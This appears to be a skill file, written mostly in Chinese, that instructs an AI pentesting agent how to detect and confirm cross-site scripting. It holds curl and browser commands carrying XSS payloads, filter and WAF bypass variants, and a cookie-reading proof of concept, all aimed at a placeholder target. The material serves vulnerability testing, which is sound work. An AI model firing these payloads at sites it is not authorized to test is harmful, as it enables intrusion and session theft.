---
name: xss
description: "跨站脚本(XSS)检测与验证。Use when: 目标有用户输入点且输出反射到页面 — 搜索框、评论、表单、URL参数"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
phase: scan
disable_model_invocation: false
---

# XSS 检测流程

## Step 1: 注入点收集

从 recon 阶段的应用模型中提取所有反射用户输入的端点：
- URL 查询参数 (`?search=`, `?q=`, `?redirect=`)
- POST 表单字段 (评论、反馈、个人信息编辑)
- HTTP 头注入点 (User-Agent, Referer — 日志型 XSS)
- JSON API 响应中反射的值

## Step 2: 上下文分析

先发一个唯一标识字符串，确认反射位置：

```bash
# 发唯一标识
curl -sk "https://TARGET/search?q=XSSCHECK12345" | grep -o "XSSCHECK12345"
```

从 HTML 上下文判断 XSS 类型：
- 在 `<div>XSSCHECK12345</div>` 中 → 需要 HTML 标签闭合 `</div><script>alert(1)</script>`
- 在 `<input value="XSSCHECK12345">` 中 → 需要属性闭合 `"><script>alert(1)</script>`
- 在 `<script>var q="XSSCHECK12345"</script>` 中 → 需要 JS 字符串闭合 `";alert(1)//`
- 在 `href="XSSCHECK12345"` 中 → `javascript:alert(1)`

## Step 3: 根据上下文构造 payload

```bash
# HTML 上下文 — 基础
curl -sk "https://TARGET/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# HTML 上下文 — 绕过简单过滤 (大小写/标签变体)
curl -sk "https://TARGET/search?q=%3CScRiPt%3Ealert(1)%3C%2FsCrIpT%3E"
curl -sk "https://TARGET/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
curl -sk "https://TARGET/search?q=%3Csvg%20onload%3Dalert(1)%3E"

# 属性闭合
curl -sk 'https://TARGET/search?q="><script>alert(1)</script>'
curl -sk "https://TARGET/search?q='%20onclick='alert(1)"

# JS 字符串闭合
curl -sk 'https://TARGET/search?q=%27;alert(1);//'

# DOM XSS — 用浏览器验证
browser(action="navigate", url="https://TARGET/search?q=<img src=x onerror=alert(1)>")
browser(action="screenshot")  # 截取 alert 弹窗作为证据
```

## Step 4: WAF 绕过

如果目标有 WAF：

```bash
# 编码绕过
curl -sk "https://TARGET/search?q=%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E"

# 事件处理器变体
curl -sk "https://TARGET/search?q=%3Cbody%20onpageshow%3Dalert(1)%3E"
curl -sk "https://TARGET/search?q=%3Cdetails%20open%20ontoggle%3Dalert(1)%3E"

# 协议绕过 (javascript: 变体)
curl -sk "https://TARGET/search?q=java%0ascript:alert(1)"
```

## Step 5: 浏览器验证

XSS 的最终确认必须用浏览器——只有浏览器能执行 JavaScript：

```
browser(action="navigate", url="https://TARGET/search?q=<svg onload=alert(document.cookie)>")
browser(action="screenshot")  → 截取弹窗

如果没有弹窗但 payload 确实反射了:
browser(action="execute_js", value="document.querySelector('...')?.innerHTML")
→ 检查 DOM 中是否包含注入的 payload
```

如果浏览器弹出 alert → `confirm_finding(severity="medium", evidence_ids=[screenshot_id])`

如果反射但没有执行 (CSP 阻止) → `create_candidate_finding(severity="low", title="反射型 XSS (CSP 缓解)")`

## 注意事项

- 不要只靠 `<script>alert(1)</script>` — 很多现代应用过滤 `<script>` 标签但不过滤事件处理器
- DOM XSS 必须用浏览器测试 — curl 看不到 JavaScript 执行
- 存储型 XSS 需要在输入点提交 payload 后检查其他页面 (如管理员后台) 是否触发
- CSP 头存在时标注"CSP 缓解"但不降低漏洞等级 — CSP 可被绕过
